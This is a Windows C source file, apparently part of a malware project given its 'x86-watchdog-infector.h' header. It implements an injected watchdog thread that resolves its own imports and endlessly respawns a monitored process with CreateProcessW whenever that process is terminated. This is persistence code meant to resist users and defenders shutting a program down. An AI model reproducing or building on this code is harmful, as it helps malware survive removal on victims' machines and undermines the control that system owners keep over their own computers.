#include <Windows.h>
#include <winternl.h>

#include "x86-watchdog-infector.h"

DWORD WINAPI
ThreadProc(_In_ LPVOID lpParameter)
{
  struct dll_imports imports;

  if (resolve_dll_imports(&imports) < 0) {
    return -1;
  }

  struct thread_params* thread_params = lpParameter;

  return monitor_proc_id(&imports, thread_params->map, thread_params->mutex);
}

int
monitor_proc_id(struct dll_imports* imports,
                struct watchdog_info* map,
                HANDLE mutex)
{
  PROCESS_INFORMATION proc_info;
  STARTUPINFOW start_info;
  WCHAR command_line[32768];

  do {

    DWORD wait_result = imports->WaitForSingleObject(mutex, INFINITE);

    if (wait_result == WAIT_OBJECT_0 || wait_result == WAIT_ABANDONED) {
      if (process_exists(imports, map->proc_id) == FALSE) {
        libc_memset(&proc_info, 0, sizeof proc_info);
        libc_memset(&start_info, 0, sizeof start_info);

        start_info.cb = sizeof start_info;

        libc_memcpy(&command_line, map->command_line, sizeof command_line);

        if (imports->CreateProcessW(map->path,
                                    command_line,
                                    NULL,
                                    NULL,
                                    0,
                                    0,
                                    NULL,
                                    NULL,
                                    &start_info,
                                    &proc_info)) {
          map->proc_id = (ULONGLONG)proc_info.dwProcessId;

          imports->CloseHandle(proc_info.hProcess);
          imports->CloseHandle(proc_info.hThread);
        }
      }

      imports->Sleep(1000);

      imports->ReleaseMutex(mutex);
    }
  } while (1);

  return 0;
}
